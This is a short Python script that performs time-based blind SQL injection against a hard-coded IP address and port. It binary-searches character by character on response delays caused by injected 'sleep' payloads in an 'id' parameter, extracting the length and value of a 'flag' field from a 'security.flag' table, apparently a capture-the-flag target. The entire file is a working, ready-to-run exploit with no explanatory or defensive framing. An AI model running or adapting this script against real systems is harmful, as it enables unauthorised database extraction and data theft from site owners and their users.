import requests
import time


def guess_number(url, num_guess_payload, inter_time):
    start = 0
    end = 100
    while 1:
        payload = '''?id=1 and if(({})>{},sleep({}),1)#'''\
                            .format(num_guess_payload, (start + end) // 2, inter_time)
        (start, end) = change_start_end(url + payload, inter_time, start, end)
        if start == end:
            print("number={}".format(start))
            break
    return start


def guess_name(url, num_guess_payload, name_guess_payload, inter_time):
    length = guess_number(url, num_guess_payload, inter_time)
    s = ""
    for i in range(length):
        start = 32
        end = 126
        while 1:
            payload = '''?id=1 and if(ascii(substr(({}),{},1))>{},sleep({}),1)#'''\
                                .format(name_guess_payload, i + 1, (start + end) // 2, inter_time)
            (start, end) = change_start_end(url + payload, inter_time, start, end)
            if start == end:
                s += chr(start)
                break
        print(s)


def change_start_end(url_payload, inter_time, start, end):
    time_start = time.time()
    requests.get(url_payload)
    time_end = time.time()
    if time_end - time_start < inter_time:
        end = (start + end) // 2
    else:
        start = (start + end) // 2 + 1
    return start, end


if __name__ == "__main__":
    Url = "http://111.229.209.37:20023/"
    num_gp = '''(select length(flag) from security.flag)'''
    name_gp = '''(select flag from security.flag)'''
    guess_name(Url, num_gp, name_gp, 1)
